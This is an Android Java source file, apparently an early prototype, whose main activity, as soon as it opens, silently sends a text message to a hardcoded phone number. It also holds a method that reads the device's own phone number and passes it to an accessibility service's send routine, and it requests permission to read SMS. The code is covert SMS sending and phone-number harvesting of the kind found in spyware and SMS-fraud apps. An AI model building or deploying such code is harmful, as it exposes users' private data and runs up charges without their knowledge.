package me.paradis.getphonenumber;

import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;
import static android.Manifest.permission.SEND_SMS;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MainActivity extends AppCompatActivity {

    MyAccessibilityService myAccessibilityService = new MyAccessibilityService();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        getPhoneNumber1();
    }

    public void getPhoneNumber1(){
        if (ActivityCompat.checkSelfPermission(this, SEND_SMS) ==
                PackageManager.PERMISSION_GRANTED){

            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage("+5491158329344", null, "mensaje prueba", null, null);

            Intent sendIntent = new Intent(Intent.ACTION_VIEW);
            sendIntent.putExtra("sms_body", "default content");
            sendIntent.setType("vnd.android-dir/mms-sms");
            startActivity(sendIntent);
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                System.out.println("test0");
                requestPermissions(new String[]{SEND_SMS}, 100);
            }else {
                System.out.println("test1");

            }
        }

    }

    public void getPhoneNumber(){
        if (ActivityCompat.checkSelfPermission(this, READ_PHONE_NUMBERS) ==
                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
                READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            System.out.println("perms checked starting ----------");
            // Permission check

            // Create obj of TelephonyManager and ask for current telephone service
            TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
            String phoneNumber = telephonyManager.getLine1Number();

            System.out.println("PHONE NUMBER FOUND : " + phoneNumber + " --------");
            myAccessibilityService.send("test");
            myAccessibilityService.send(phoneNumber);
            return;
        } else {
            // Ask for permission}
            System.out.println("asking for perms");
            requestPermission();
        }
    }

    private void requestPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            System.out.println("test0");
            requestPermissions(new String[]{READ_SMS, READ_PHONE_NUMBERS, READ_PHONE_STATE}, 100);
        }else {
            System.out.println("test1");

        }
    }
}